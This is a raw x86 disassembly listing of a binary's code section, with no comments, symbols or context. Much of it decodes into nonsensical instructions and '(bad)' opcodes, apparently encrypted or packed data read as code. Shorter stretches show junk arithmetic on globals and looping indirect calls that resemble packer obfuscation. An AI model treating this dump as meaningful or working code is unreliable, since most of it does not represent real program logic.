  40a9ea:	pop    ebx
  40a9eb:	in     eax,0xe
  40a9ed:	pop    ss
  40a9ee:	sbb    BYTE PTR [ebx+edx*8+0x33],ah
  40a9f2:	xor    eax,DWORD PTR [eax]
  40a9f4:	sub    BYTE PTR [ebx],0xe9
  40a9f7:	and    BYTE PTR [edx+0x2d],ch
  40a9fa:	jnp    0x40aa79
  40a9fc:	sbb    DWORD PTR [esi-0xf31ec05],edi
  40aa02:	mov    eax,ds:0xbb2100a4
  40aa07:	jb     0x40a9e4
  40aa09:	ds jl  0x40aa87
  40aa0c:	and    cl,BYTE PTR [eax]
  40aa0e:	div    BYTE PTR ss:[edx]
  40aa11:	add    ch,ah
  40aa13:	mov    WORD PTR [esi],cs
  40aa15:	lods   al,BYTE PTR ds:[esi]
  40aa16:	call   0xbf66210d
  40aa1b:	ja     0x40a9f4
  40aa1d:	mov    bl,0xec
  40aa1f:	bound  esi,QWORD PTR [ecx]
  40aa21:	ins    BYTE PTR es:[edi],dx
  40aa22:	sti    
  40aa23:	jmp    0x2c0fe180
  40aa28:	loop   0x40aa50
  40aa2a:	cmp    eax,0xe0a45af1
  40aa2f:	jbe    0x40a9d2
  40aa31:	or     esp,esi
  40aa33:	and    DWORD PTR [ebx-0x3e],0x689c326c
  40aa3a:	int3   
  40aa3b:	xchg   edi,eax
  40aa3c:	dec    edi
  40aa3d:	sub    DWORD PTR [ebx+0x42],0xffffffa8
  40aa41:	cli    
  40aa42:	scas   al,BYTE PTR es:[edi]
  40aa43:	jno    0x40a9cc
  40aa45:	cmp    DWORD PTR [edi],edx
  40aa47:	das    
  40aa48:	mov    ebx,0xba306d8d
  40aa4d:	(bad)  
  40aa4e:	push   eax
  40aa4f:	or     BYTE PTR gs:[ecx-0x1],ah
  40aa53:	jne    0x40aa21
  40aa55:	data16 jg 0x40aabd
  40aa58:	daa    
  40aa59:	jp     0x40aa59
  40aa5b:	xchg   edi,eax
  40aa5c:	xchg   ecx,eax
  40aa5d:	adc    eax,0xd5a97187
  40aa62:	pop    ebx
  40aa63:	clc    
  40aa64:	aas    
  40aa65:	and    BYTE PTR [edi],0x17
  40aa68:	pushf  
  40aa69:	stos   BYTE PTR es:[edi],al
  40aa6a:	mov    ebp,0x9440d55b
  40aa6f:	pop    esp
  40aa70:	mov    ch,0x5b
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x4346d3,0x4346ff
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x434673,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x43477b
  40aa9b:	sub    ebx,DWORD PTR ds:0x43478b
  40aaa1:	mov    DWORD PTR ds:0x43477b,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x43473b
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	repnz push 0xfefc9096
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	lods   al,BYTE PTR ds:[esi]
  40aad7:	pop    ecx
  40aad8:	js     0x40ab14
  40aada:	mov    al,ds:0x491acdf9
  40aadf:	xchg   esp,eax
  40aae0:	cmp    al,0xae
  40aae2:	fldenv [ebx]
  40aae4:	inc    esp
  40aae5:	outs   dx,DWORD PTR ds:[esi]
  40aae6:	adc    eax,0x63f6e1be
  40aaeb:	icebp  
  40aaec:	xchg   BYTE PTR [edi+0x20],bh
  40aaef:	sub    al,BYTE PTR [edi-0x2d8da22c]
  40aaf5:	cmp    ebx,DWORD PTR [esi-0x36]
  40aaf8:	jb     0x40ab2b
  40aafa:	mov    edi,0xb78eb77e
  40aaff:	sub    ah,BYTE PTR [esp+edx*1-0x748facd6]
  40ab06:	mov    ecx,0x16e5b65e
  40ab0b:	add    eax,0x6d8494ba
  40ab10:	xor    eax,0xeab07ee4
  40ab15:	xchg   esp,eax
  40ab16:	jb     0x40ab09
  40ab18:	lea    ebp,[ecx+ebp*4+0x2]
  40ab1c:	mov    si,0x24d5
  40ab20:	add    ah,bl
  40ab22:	push   cs
  40ab23:	mov    DWORD PTR [eax+edx*2+0x3b],edi
  40ab27:	(bad)  
  40ab29:	arpl   WORD PTR [edi-0x253425aa],bx
  40ab2f:	sub    ecx,esp
  40ab31:	sub    dh,ch
  40ab33:	lods   al,BYTE PTR ds:[esi]
  40ab34:	fiadd  DWORD PTR [eax-0x37]
  40ab37:	dec    esi
  40ab38:	and    ah,BYTE PTR [edi+0x7d10523f]
  40ab3e:	cmp    DWORD PTR [edx-0x15601e89],eax
  40ab44:	outs   dx,DWORD PTR ds:[esi]
  40ab45:	xor    BYTE PTR [esi+0x51],cl
  40ab48:	imul   DWORD PTR ds:0x1759e4d5
  40ab4e:	jnp    0x40ab47
  40ab50:	xchg   DWORD PTR [ecx+0x1fc68ca0],eax
  40ab56:	pop    es
  40ab57:	or     eax,0x69869f63
  40ab5c:	lahf   
  40ab5d:	das    
  40ab5e:	rcr    BYTE PTR [esi+ebp*4-0x3],1
  40ab62:	cmp    al,0x49
  40ab64:	(bad)  
  40ab65:	not    ebx
  40ab67:	imul   eax,edx,0xffffffda
  40ab6a:	ror    DWORD PTR [edi-0x48948fca],1
  40ab70:	xor    dh,BYTE PTR [edx]
  40ab72:	jmp    0x77cec161
  40ab77:	xor    al,0x77
  40ab79:	mov    ebp,0x6ec19b64
  40ab7e:	popa   
  40ab7f:	inc    eax
  40ab80:	imul   esp,DWORD PTR [edi-0x363f6882],0xa402142b
  40ab8a:	iret   
  40ab8b:	jnp    0x40abd3
  40ab8d:	inc    ebx
  40ab8e:	jge    0x40abc5
  40ab90:	dec    eax
  40ab91:	jmp    0x40ab63
  40ab93:	inc    edx
  40ab94:	jbe    0x40abbd
  40ab96:	sbb    al,ah
  40ab98:	pop    edx
  40ab99:	dec    ecx
  40ab9a:	push   ebp
  40ab9b:	sbb    eax,0x13ea55b2
  40aba0:	mov    dh,0x35
  40aba2:	fidiv  DWORD PTR [ecx-0xb]
  40aba5:	mov    edx,0xfeaf3e8e
  40abaa:	jae    0x40ab9d
  40abac:	addr16 or eax,0xe35a881
  40abb2:	call   0x99fc73b2
  40abb7:	test   DWORD PTR [ebx],esp
  40abb9:	jbe    0x40ab96
  40abbb:	mov    al,0x1d
  40abbd:	sbb    edx,DWORD PTR [eax+esi*8+0x7aff2a12]
  40abc4:	arpl   WORD PTR [edi+esi*1+0x79],sp
  40abc8:	inc    eax
  40abc9:	adc    BYTE PTR [edx-0xc],bl
  40abcc:	aad    0x33
  40abce:	(bad)  
  40abcf:	jmp    0x36c5:0x23c598ac
  40abd6:	dec    ebx
  40abd7:	fsincos 
  40abd9:	push   ds
  40abda:	adc    BYTE PTR [eax+0x8],ch
  40abdd:	sbb    al,0xc4
  40abdf:	xlat   BYTE PTR ds:[ebx]
  40abe0:	je     0x40ab63
  40abe2:	rcr    DWORD PTR [edi-0x1eec7d29],0x91
  40abe9:	cmc    
  40abea:	cmp    dh,al
  40abec:	lods   eax,DWORD PTR ds:[esi]
  40abed:	dec    edi
  40abee:	lock xor cl,BYTE PTR [ecx+0x7e]
  40abf2:	push   ebp
  40abf3:	fistp  QWORD PTR [ebx]
  40abf5:	neg    ebp
  40abf7:	cmp    BYTE PTR fs:[edi],cl
  40abfa:	mov    BYTE PTR [esi],bh
  40abfc:	fcom   DWORD PTR [ebp-0x72f44ff]
  40ac02:	lock mov ch,0xf0
  40ac05:	jne    0x40ac55
  40ac07:	aas    
  40ac08:	jne    0x40ac74
  40ac0a:	push   esi
  40ac0b:	sbb    eax,0xde18abbe
  40ac10:	mov    ebp,0x3f18f393
  40ac15:	cmp    BYTE PTR [esi],dh
  40ac17:	icebp  
  40ac18:	push   ds
  40ac19:	ins    BYTE PTR es:[edi],dx
  40ac1a:	fisub  WORD PTR [eax]
  40ac1c:	or     edx,edx
  40ac1e:	add    eax,ecx
  40ac20:	outs   dx,BYTE PTR ds:[esi]
  40ac21:	std    
  40ac22:	sbb    bl,BYTE PTR [eax]
  40ac24:	(bad)  
  40ac25:	jo     0x40ac0e
  40ac27:	and    BYTE PTR [edx],dl
  40ac29:	outs   dx,BYTE PTR ds:[esi]
  40ac2a:	and    DWORD PTR [di-0x59ae],esp
  40ac2f:	cld    
  40ac30:	sbb    al,0xcf
  40ac32:	jp     0x40ac13
  40ac34:	xchg   ebp,eax
  40ac35:	rcr    DWORD PTR [ecx+0x1fb4326f],1
  40ac3b:	cmp    ch,BYTE PTR [edx-0x6c]
  40ac3e:	in     eax,0xf7
  40ac40:	int3   
  40ac41:	imul   esp,DWORD PTR [ecx+0x2746958a],0x258ced08
  40ac4b:	and    al,0x66
  40ac4d:	and    bl,ch
  40ac4f:	rcl    BYTE PTR [ecx+0x18fb385b],cl
  40ac55:	clc    
  40ac56:	or     eax,DWORD PTR [edi+0x77]
  40ac59:	push   cs
  40ac5a:	cmp    al,0x9a
  40ac5c:	(bad)  
  40ac5d:	fiadd  WORD PTR [esi-0x6267f954]
  40ac63:	fmul   QWORD PTR [edx+ebx*2]
  40ac66:	addr16 pop esp
  40ac68:	push   es
  40ac69:	xor    cl,BYTE PTR [edx+0x3c]
  40ac6c:	pusha  
  40ac6d:	cmp    ch,BYTE PTR [edi-0x20bd3bd9]
  40ac73:	add    eax,0xfabd98
  40ac78:	cmp    BYTE PTR [ecx],bh
  40ac7a:	outs   dx,BYTE PTR ds:[esi]
  40ac7b:	mov    ch,0x4f
  40ac7d:	arpl   WORD PTR [esi],sp
  40ac7f:	xchg   edi,eax
  40ac80:	fcmovnbe st,st(7)
  40ac82:	aam    0x8a
  40ac84:	jp     0x40ac5c
  40ac86:	adc    eax,0x90e83afb
  40ac8b:	ins    BYTE PTR es:[edi],dx
  40ac8c:	jg     0x40acd3
  40ac8e:	cmp    DWORD PTR [ecx],ebx
  40ac90:	cmp    BYTE PTR [ebx-0x5f],0x96
  40ac94:	sbb    ah,BYTE PTR [eax-0x4af58343]
  40ac9a:	or     bh,BYTE PTR [ecx]
  40ac9c:	loope  0x40acc6
  40ac9e:	(bad)  
  40ac9f:	int3   
  40aca0:	mov    ch,0x1f
  40aca2:	into   
  40aca3:	xor    BYTE PTR [edi],cl
  40aca5:	push   eax
  40aca6:	push   es
  40aca7:	sbb    eax,DWORD PTR [esi+0x723c0072]
  40acad:	mov    DWORD PTR [esi-0xad77bab],esp
  40acb3:	call   DWORD PTR [edi+0x2671a26e]
  40acb9:	push   ebx
  40acba:	lods   al,BYTE PTR ds:[esi]
  40acbb:	and    al,0x1c
  40acbd:	cwde   
  40acbe:	xor    DWORD PTR [edx+edi*2-0x63717f5d],ebp
  40acc5:	push   ecx
  40acc6:	jle    0x40aca2
  40acc8:	sbb    bl,cl
  40acca:	in     eax,dx
  40accb:	cwde   
  40accc:	loop   0x40ac8d
  40acce:	sbb    bh,BYTE PTR [eax+0x13]
  40acd1:	sub    DWORD PTR [ebp+eax*1+0x182c6175],edx
  40acd8:	out    dx,eax
  40acd9:	out    dx,eax
  40acda:	cmp    ebx,DWORD PTR [eax-0x2b]
  40acdd:	push   0xb7d45a4c
  40ace2:	xor    ah,ch
  40ace4:	outs   dx,DWORD PTR ds:[esi]
  40ace5:	aaa    
  40ace6:	xchg   BYTE PTR ds:0x53bad073,bh
  40acec:	push   di
  40acee:	adc    al,0xa
  40acf0:	std    
  40acf1:	jge    0x40ad09
  40acf3:	jae    0x40ad56
  40acf5:	xlat   BYTE PTR ds:[ebx]
  40acf6:	lds    ebx,FWORD PTR [ebp-0x55]
  40acf9:	dec    ebx
  40acfa:	inc    ecx
  40acfb:	(bad)  
  40acfc:	or     BYTE PTR [esi],ah
  40acfe:	jle    0x40ad67
  40ad00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad01:	pop    ebx
  40ad02:	nop
  40ad03:	xor    DWORD PTR [edi-0x62],esp
  40ad06:	jb     0x40ac93
  40ad08:	(bad)  
  40ad09:	je     0x40ad68
  40ad0b:	mov    ds:0x229d47a0,al
  40ad10:	in     al,dx
  40ad11:	mov    dh,0xce
  40ad13:	js     0x40ad56
  40ad15:	jge    0x40ad93
  40ad17:	cmp    eax,0x28eb7022
  40ad1c:	jb     0x40ad36
  40ad1e:	(bad)  
  40ad1f:	retf   
  40ad20:	rcl    BYTE PTR [esi-0x21],cl
  40ad23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad24:	jne    0x40ad29
  40ad26:	adc    al,BYTE PTR [esi+0x6fbaacc7]
  40ad2c:	loope  0x40ad86
  40ad2e:	mov    ah,bl
  40ad30:	mov    ebx,0x4946ce9f
  40ad35:	cmc    
  40ad36:	cs cdq 
  40ad38:	cmp    ebx,DWORD PTR ds:0xb87e939
  40ad3e:	sti    
  40ad3f:	iret   
  40ad40:	popa   
  40ad41:	ret    
  40ad42:	mov    bh,0xc4
  40ad44:	sbb    ebx,DWORD PTR [ebp+0x63c4d1b2]
  40ad4a:	mov    bl,ah
  40ad4c:	js     0x40acfc
  40ad4e:	mov    eax,ds:0x84dd1d6e
  40ad53:	pop    ebx
  40ad54:	(bad)  
  40ad57:	repnz fidivr DWORD PTR [ebp-0xcea0883]
  40ad5e:	cmp    bl,BYTE PTR [esi+0x4db65d58]
  40ad64:	arpl   WORD PTR [edx+0x208ae0d5],dx
  40ad6a:	cmp    eax,0x59e3f0a3
  40ad6f:	xchg   esi,eax
  40ad70:	inc    eax
  40ad71:	sbb    BYTE PTR [ebx-0xa],0xcd
  40ad75:	push   ebx
  40ad76:	mov    dh,0x8d
  40ad78:	push   0x9fa24ac3
  40ad7d:	jb     0x40ad7b
  40ad7f:	add    dh,al
  40ad81:	pop    esp
  40ad82:	nop
  40ad83:	fwait
  40ad84:	in     al,dx
  40ad85:	fsub   QWORD PTR [edx+0xe]
  40ad88:	sbb    esi,DWORD PTR [eax-0x5c]
  40ad8b:	sub    DWORD PTR [eax+0x15],eax
  40ad8e:	and    edx,DWORD PTR [esi-0x42]
  40ad91:	or     al,0x7
  40ad93:	sbb    DWORD PTR [edx-0x40516b5c],esp
  40ad99:	or     esp,ebx
  40ad9b:	(bad)  
  40ad9c:	cli    
  40ad9d:	retf   
  40ad9e:	cld    
  40ad9f:	sbb    BYTE PTR [ebp-0x72],ah
  40ada2:	mov    ebx,0x44600e4
  40ada7:	adc    ebx,ecx
  40ada9:	sbb    eax,0xcf8178af
  40adae:	stos   BYTE PTR es:[edi],al
  40adaf:	das    
  40adb0:	out    0xd7,eax
  40adb2:	inc    esi
  40adb3:	popf   
  40adb4:	lahf   
  40adb5:	push   esi
  40adb6:	sub    eax,0x3b309bfc
  40adbb:	push   0x72
  40adbd:	xchg   ebx,eax
  40adbe:	aam    0xde
  40adc0:	and    BYTE PTR [ebp+0x1b],dh
  40adc3:	xlat   BYTE PTR ds:[ebx]
  40adc4:	and    ch,BYTE PTR [ebp+0x1a]
  40adc7:	sub    al,ah
  40adc9:	fimul  DWORD PTR [ebp-0x6a]
  40adcc:	inc    esi
  40adcd:	pushf  
  40adce:	and    dl,cl
  40add0:	push   ebx
  40add1:	dec    ebp
  40add2:	int    0xa2
  40add4:	les    esp,FWORD PTR [ecx-0x1]
  40add7:	push   ss
  40add8:	pushf  
  40add9:	rcr    DWORD PTR [ebp-0x7c],1
  40addc:	(bad)  
  40adde:	retf   0xaf2
  40ade1:	jecxz  0x40ae3d
  40ade3:	dec    ebx
  40ade4:	aas    
  40ade5:	xchg   ebx,eax
  40ade6:	mov    BYTE PTR ds:0x9654ff73,dl
  40adec:	scas   al,BYTE PTR es:[edi]
  40aded:	mov    esp,0x4eb05045
  40adf2:	pop    ebp
  40adf3:	sti    
  40adf4:	rcr    BYTE PTR [edx+esi*4],0x6e
  40adf8:	test   al,0x20
  40adfa:	(bad)  
  40adfb:	mov    dh,0x1f
  40adfd:	pop    es
  40adfe:	pusha  
  40adff:	mov    cl,0x1e
  40ae01:	shl    DWORD PTR [eax+eiz*2+0x327d52a],cl
  40ae08:	mov    WORD PTR [ecx+0x2e770d5c],ds
  40ae0e:	call   0x6c8fe980
  40ae13:	(bad)  
  40ae14:	push   ss
  40ae15:	or     eax,0x3daeba6e
  40ae1a:	or     DWORD PTR ds:0xb5c15b00,0xffffffa7
  40ae21:	xchg   edi,eax
  40ae22:	fcomp  DWORD PTR [edx+0x1c4952a]
  40ae28:	sbb    al,0x92
  40ae2a:	aaa    
  40ae2b:	add    BYTE PTR [eax+0x49e14ac1],al
  40ae31:	cdq    
  40ae32:	loope  0x40ae71
  40ae34:	xchg   ebx,eax
  40ae35:	out    0x9f,al
  40ae37:	inc    eax
  40ae38:	sbb    BYTE PTR [ecx-0x4e],bl
  40ae3b:	mov    dh,0x3e
  40ae3d:	pop    ebp
  40ae3e:	adc    eax,0xf05561ad
  40ae43:	test   BYTE PTR [edx+0x30],dh
  40ae46:	xchg   ebx,eax
  40ae47:	test   BYTE PTR [edx+0xb],ah
  40ae4a:	ins    BYTE PTR es:[edi],dx
  40ae4b:	inc    edi
  40ae4c:	pop    ss
  40ae4d:	(bad)  
  40ae4e:	iret   
  40ae4f:	or     cl,ah
  40ae51:	xchg   ebx,eax
  40ae52:	cmp    al,0xce
  40ae54:	or     DWORD PTR [ebp+0x6e],esp
  40ae57:	sar    DWORD PTR [ebp+0x1d],cl
  40ae5a:	stos   BYTE PTR es:[edi],al
  40ae5b:	inc    edx
  40ae5c:	ror    ah,cl
  40ae5e:	fadd   QWORD PTR [eax-0x28]
  40ae61:	or     bl,BYTE PTR [edi+0x18]
  40ae64:	inc    ebx
  40ae65:	xor    eax,DWORD PTR [ebx-0x9]
  40ae68:	maxps  xmm5,XMMWORD PTR [eax-0x23]
  40ae6c:	dec    eax
  40ae6d:	dec    edi
  40ae6e:	inc    esi
  40ae6f:	mov    edx,0xaacf47b1
  40ae74:	jne    0x40aeed
  40ae76:	push   ecx
  40ae77:	xor    dl,BYTE PTR [edx]
  40ae79:	pushf  
  40ae7a:	fnstsw WORD PTR [eax-0x259848c2]
  40ae80:	cwde   
  40ae81:	js     0x40ae41
  40ae83:	in     al,dx
  40ae84:	call   0xf784:0xabe049cd
  40ae8b:	or     DWORD PTR [edx+0x1603aa33],0xc6cabb8e
  40ae95:	test   BYTE PTR [ebx-0x3877cabe],cl
  40ae9b:	jl     0x40ae2c
  40ae9d:	xchg   edx,eax
  40ae9e:	add    ch,BYTE PTR [eax+esi*8]
  40aea1:	popf   
  40aea2:	dec    edi
  40aea3:	pop    eax
  40aea4:	jno    0x40aeaa
  40aea6:	(bad)  
  40aea7:	mov    dl,0x36
  40aea9:	mov    cl,0x25
  40aeab:	in     eax,dx
  40aeac:	mov    BYTE PTR [edx+0x49],bl
  40aeaf:	pop    es
  40aeb0:	add    al,bl
  40aeb2:	add    eax,DWORD PTR [edx+0x3c]
  40aeb5:	neg    DWORD PTR [eax]
  40aeb7:	loope  0x40aed9
  40aeb9:	imul   esi,DWORD PTR [edx-0x6b],0xe796666d
  40aec0:	loopne 0x40aed8
  40aec2:	mov    esi,0x6d7840d1
  40aec7:	xor    al,0x4d
  40aec9:	jne    0x40aecb
  40aecb:	aam    0xc1
  40aecd:	sub    eax,0xd103fe15
  40aed2:	imul   edx,edi
  40aed5:	xor    ebx,DWORD PTR ds:0x4346d3
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x4346c7,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x4346bf,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x43477f,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43470f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x43466f,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x4346bb,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x4346c7,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x4346c7
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x4346c7,ebx
  40af4d:	cmp    DWORD PTR ds:0x4346c7,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x4346c7,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x4346f7
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43470b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434793,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434793
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434793,ebx
  40afaa:	cmp    DWORD PTR ds:0x434793,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434793,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	xlat   BYTE PTR ds:[ebx]
  40affc:	stos   BYTE PTR es:[edi],al
  40affd:	pop    ecx
  40affe:	add    dh,dh
  40b000:	cli    
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	pop    esp
  40b008:	sub    dl,ah
  40b00a:	(bad)  
  40b00b:	lock mov edx,0xe02ad425
  40b011:	or     cl,BYTE PTR [edx]
  40b013:	ins    BYTE PTR es:[edi],dx
  40b014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b015:	loopne 0x40afcb
  40b017:	add    BYTE PTR [edi+0x18],cl
  40b01a:	bound  ebp,QWORD PTR [ebp-0x394d497e]
  40b020:	mov    eax,0xf9e6718f
  40b025:	add    eax,0x29e8142d
  40b02a:	outs   dx,BYTE PTR ds:[esi]
  40b02b:	cmp    eax,0xd158550f
  40b030:	cld    
  40b031:	aam    0xf0
  40b033:	lods   al,BYTE PTR ds:[esi]
  40b034:	jmp    0x40b071
  40b036:	jmp    0x7698:0x6dda73c5
  40b03d:	loop   0x40b047
  40b03f:	push   edi
  40b040:	add    ah,ch
  40b042:	jne    0x40b06e
  40b044:	pusha  
  40b045:	or     al,0x30
  40b047:	sbb    ebp,DWORD PTR [ecx-0x61b0d974]
  40b04d:	fwait
  40b04e:	bound  ecx,QWORD PTR [ebx-0xe]
  40b051:	ins    DWORD PTR es:[edi],dx
  40b052:	inc    esp
  40b053:	pop    ebp
  40b054:	pop    ebx
  40b055:	in     eax,dx
  40b056:	pop    ss
  40b057:	xchg   ebp,eax
  40b058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b059:	div    DWORD PTR [ecx]
  40b05b:	pop    eax
  40b05c:	std    
  40b05d:	in     eax,0xf0
  40b05f:	fsub   QWORD PTR [ecx-0x57]
  40b062:	cs aad 0xf1
  40b065:	imul   DWORD PTR [ebp-0x3c]
  40b068:	test   eax,0xacee7192
  40b06d:	and    al,0x8
  40b06f:	xchg   DWORD PTR [esi],ecx
  40b071:	pushf  
  40b072:	push   cs
  40b073:	in     eax,0x36
  40b075:	cmp    al,0xbe
  40b077:	addr16 push ds
  40b079:	popa   
  40b07a:	adc    dh,cl
  40b07c:	or     edx,DWORD PTR [eax]
  40b07e:	scas   al,BYTE PTR es:[edi]
  40b07f:	xor    eax,0x9ebc3d27
  40b084:	inc    esi
  40b085:	imul   DWORD PTR [ecx+0x30]
  40b088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b089:	mov    ds:0x4c730253,al
  40b08e:	(bad)  
  40b08f:	cmp    al,0xd3
  40b091:	ret    
  40b092:	fwait
  40b093:	rcr    DWORD PTR ds:0x4578bfd5,cl
  40b099:	sub    al,0xe8
  40b09b:	fcomp  QWORD PTR [ebx-0x24]
  40b09e:	jb     0x40b115
  40b0a0:	in     al,0x16
  40b0a2:	cmp    eax,0xa607be35
  40b0a7:	mov    eax,fs
  40b0a9:	fdivr  DWORD PTR [esi+ebx*8+0x77a04394]
  40b0b0:	(bad)  
  40b0b1:	push   esp
  40b0b2:	sub    al,0xb0
  40b0b4:	aas    
  40b0b5:	sbb    eax,0x194b9c86
  40b0ba:	adc    DWORD PTR [edx-0x46],esp
  40b0bd:	jmp    0x40b062
  40b0bf:	xor    eax,0x22f81ccd
  40b0c4:	xchg   BYTE PTR [ebx-0x62bb0e63],bh
  40b0ca:	das    
  40b0cb:	imul   ecx,ebx,0x6302b371
  40b0d1:	fbstp  TBYTE PTR [eax]
  40b0d3:	retf   0x7f6c
  40b0d6:	ret    
  40b0d7:	nop
  40b0d8:	add    eax,0xb84cab0
  40b0dd:	not    DWORD PTR [eax+0x1266e83d]
  40b0e3:	(bad)  
  40b0e4:	ins    BYTE PTR es:[edi],dx
  40b0e5:	sbb    bl,dh
  40b0e7:	dec    DWORD PTR [esi]
  40b0e9:	in     eax,dx
  40b0ea:	aaa    
  40b0eb:	push   cs
  40b0ec:	add    al,0xcb
  40b0ee:	pop    ebp
  40b0ef:	mov    dh,0x99
  40b0f1:	inc    edi
  40b0f2:	push   ebp
  40b0f3:	and    esp,DWORD PTR [edx]
  40b0f5:	fldenv [edx+0x67e51d00]
  40b0fb:	jecxz  0x40b153
  40b0fd:	shr    DWORD PTR [edi+0x4d7eab2e],0xc7
  40b104:	adc    ah,BYTE PTR [ebp-0x55]
  40b107:	jbe    0x40b0b3
  40b109:	test   DWORD PTR [ecx+ebx*4],edx
  40b10c:	xor    DWORD PTR [ebx-0x7a],esi
  40b10f:	inc    ecx
  40b110:	sbb    cl,BYTE PTR [esi]
  40b112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b113:	mov    al,ds:0xa4d9e718
  40b118:	mov    edi,0xb5bdf717
  40b11d:	jbe    0x40b13b
  40b11f:	jb     0x40b133
  40b121:	push   0x9932424f
  40b126:	(bad)  
  40b127:	pop    ebp
  40b128:	mov    esi,0xca25a44c
  40b12d:	jp     0x40b131
  40b12f:	and    ecx,ebx
  40b131:	std    
  40b132:	push   ss
  40b133:	mov    eax,DWORD PTR es:0x8c1cb33f
  40b13a:	mov    edx,0xb40926d0
  40b13f:	add    al,0x94
  40b141:	jno    0x40b18f
  40b143:	mov    eax,ds:0x20b6f311
  40b148:	inc    eax
  40b149:	xor    al,0x89
  40b14b:	lods   al,BYTE PTR ds:[esi]
  40b14c:	jns    0x40b1c4
  40b14e:	shl    edi,0xf2
  40b151:	mov    ebp,0xec584578
  40b156:	cwde   
  40b157:	and    BYTE PTR [edi+ecx*1],bh
  40b15a:	fmul   QWORD PTR [esp+ebx*1+0x4c815be8]
  40b161:	in     al,0x89
  40b163:	iret   
  40b164:	push   ebx
  40b165:	push   ebp
  40b166:	dec    edx
  40b167:	dec    eax
  40b168:	or     al,0xfe
  40b16a:	xor    eax,0xfcea7222
  40b16f:	cmp    eax,0x8f274525
  40b174:	jae    0x40b1d3
  40b176:	adc    al,0xe7
  40b178:	xor    al,0xf2
  40b17a:	dec    ecx
  40b17b:	add    al,0x6a
  40b17d:	fdivrp st(6),st
  40b17f:	leave  
  40b180:	enter  0xdbdf,0x54
  40b184:	es (bad) 
  40b186:	das    
  40b187:	pop    edi
  40b188:	cs dec edx
  40b18a:	das    
  40b18b:	sti    
  40b18c:	fsub   DWORD PTR [edx-0x5493a1a1]
  40b192:	mov    al,ds:0x245a1440
  40b197:	jecxz  0x40b166
  40b199:	popa   
  40b19a:	int3   
  40b19b:	dec    ecx
  40b19c:	rol    BYTE PTR [ebp-0x26],1
  40b19f:	mov    al,0x4c
  40b1a1:	stc    
  40b1a2:	inc    ebx
  40b1a3:	sub    esi,edi
  40b1a5:	xor    BYTE PTR [esi+0x5d3b7f86],cl
  40b1ab:	aaa    
  40b1ac:	mov    BYTE PTR [ebp+esi*8-0x7c],cl
  40b1b0:	bound  ecx,QWORD PTR [esi+esi*8-0x3797e5ab]
  40b1b7:	repz push 0x6aa6c03a
  40b1bd:	mov    eax,0xd53995
  40b1c2:	sub    BYTE PTR [edi-0x14],cl
  40b1c5:	sub    al,BYTE PTR [edi+0x571f9078]
  40b1cb:	adc    BYTE PTR [eax],cl
  40b1cd:	or     edx,DWORD PTR [esi+0x39]
  40b1d0:	cld    
  40b1d1:	sub    DWORD PTR [edi+0x79663c1c],edx
